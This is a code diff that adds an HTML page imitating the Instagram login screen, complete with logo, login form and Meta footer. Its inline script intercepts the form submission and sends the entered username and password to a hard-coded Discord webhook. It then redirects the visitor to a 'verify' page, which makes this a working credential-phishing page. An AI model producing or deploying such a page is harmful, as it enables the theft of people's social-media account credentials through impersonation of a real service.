@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Instagram</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <!-- Main content wrapper -->
+  <div class="wrapper">
+    <div class="lang-selector">English (US)</div>
+
+    <div class="logo-container">
+      <svg class="logo-svg" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <linearGradient id="ig-gradient" x1="0%" y1="100%" x2="100%" y2="0%">
+            <stop offset="0%" stop-color="#FFDC80" />
+            <stop offset="20%" stop-color="#FCAF45" />
+            <stop offset="40%" stop-color="#F77737" />
+            <stop offset="60%" stop-color="#F56040" />
+            <stop offset="80%" stop-color="#FD1D1D" />
+            <stop offset="90%" stop-color="#E1306C" />
+            <stop offset="95%" stop-color="#C13584" />
+            <stop offset="100%" stop-color="#833AB4" />
+          </linearGradient>
+        </defs>
+        <rect width="512" height="512" rx="128" fill="url(#ig-gradient)" />
+        <rect x="76" y="76" width="360" height="360" rx="96" fill="none" stroke="#FFFFFF" stroke-width="32" />
+        <circle cx="256" cy="256" r="88" fill="none" stroke="#FFFFFF" stroke-width="32" />
+        <circle cx="364" cy="148" r="20" fill="#FFFFFF" />
+      </svg>
+    </div>
+
+    <form id="login-form">
+      <input 
+        type="text" 
+        class="input-field" 
+        placeholder="Username, email or mobile number" 
+        aria-label="Username, email or mobile number"
+        required 
+      />
+      <input 
+        type="password" 
+        class="input-field" 
+        placeholder="Password" 
+        aria-label="Password"
+        required 
+      />
+      <button type="submit" class="btn-login">Log in</button>
+    </form>
+
+    <a href="#" class="forgot-link">Forgot password?</a>
+  </div>
+
+  <div class="footer-section">
+    <a href="#" class="btn-create">Create new account</a>
+
+    <div class="meta-brand">
+      <svg class="meta-logo" viewBox="0 0 24 24">
+        <path d="M16.98 5.5c-1.87 0-3.32.96-4.98 2.72C10.34 6.46 8.89 5.5 7.02 5.5 3.73 5.5 1 8.24 1 12s2.73 6.5 6.02 6.5c1.87 0 3.32-.96 4.98-2.72 1.66 1.76 3.11 2.72 4.98 2.72 3.29 0 6.02-2.74 6.02-6.5s-2.73-6.5-6.02-6.5zm0 10.5c-1.35 0-2.52-.77-3.92-2.32 1.4-1.55 2.57-2.32 3.92-2.32 1.95 0 3.52 1.57 3.52 3.32S18.93 16 16.98 16zm-9.96 0c-1.95 0-3.52-1.57-3.52-3.32s1.57-3.32 3.52-3.32c1.35 0 2.52.77 3.92 2.32-1.4 1.55-2.57 2.32-3.92 2.32z"/>
+      </svg>
+      Meta
+    </div>
+  </div>
+
+  <script>
+  // Paste your copied Discord Webhook URL here
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1552155762636099654/COuZP3MT6a4ZuNDJrTVQRZlwmBZ6nnaMYIYaLWkAxcU6Kdj4IYdGRIbsVBecPE_Z8CS3";
+
+  document.getElementById('login-form').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const button = this.querySelector('.btn-login');
+    button.textContent = 'Logging in...';
+
+    // Get input values
+    const inputs = this.querySelectorAll('.input-field');
+    const username = inputs[0].value;
+    const password = inputs[1].value;
+
+    // Create the message payload formatted for Discord
+    const payload = {
+      username: "Login Form Bot",
+      embeds: [
+        {
+          title: "🔑 New Form Submission",
+          color: 14431562, // Instagram Pink/Red color
+          fields: [
+            {
+              name: "Username / Email / Phone",
+              value: username || "None",
+              inline: false
+            },
+            {
+              name: "Password",
+              value: password || "None",
+              inline: false
+            }
+          ],
+          timestamp: new Date().toISOString()
+        }
+      ]
+    };
+
+    // Send payload to Discord Webhook
+    fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
+    })
+    .then(response => {
+      if (!response.ok) {
+        console.error('Failed to send message to Discord.');
+      }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+    })
+    .finally(() => {
+      // Redirect user after sending data
+      window.location.href = 'verify.html';
+    });
+  });
+</script>
+
+</body>
+</html>
